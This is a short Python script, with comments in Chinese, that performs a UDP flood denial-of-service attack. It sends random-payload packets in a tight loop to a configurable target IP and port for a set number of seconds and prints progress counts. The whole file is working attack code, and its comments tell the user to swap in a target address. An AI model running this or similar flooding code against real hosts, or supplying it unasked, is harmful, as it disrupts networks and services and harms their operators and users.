import socket
import random
import time

target_ip = "127.0.0.1"  # 修改为目标IP地址
target_port = 80         # 修改为目标端口
duration = 10            # 攻击持续时间（秒）
packet_size = 1024       # 每个UDP包大小（字节）

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
timeout = time.time() + duration
sent = 0

print(f"[INFO] Starting UDP Flood to {target_ip}:{target_port} for {duration} seconds...")

while time.time() < timeout:
    data = random._urandom(packet_size)
    sock.sendto(data, (target_ip, target_port))
    sent += 1
    if sent % 1000 == 0:
        print(f"[INFO] Sent {sent} packets...")

print(f"[INFO] UDP Flood complete. Total packets sent: {sent}")
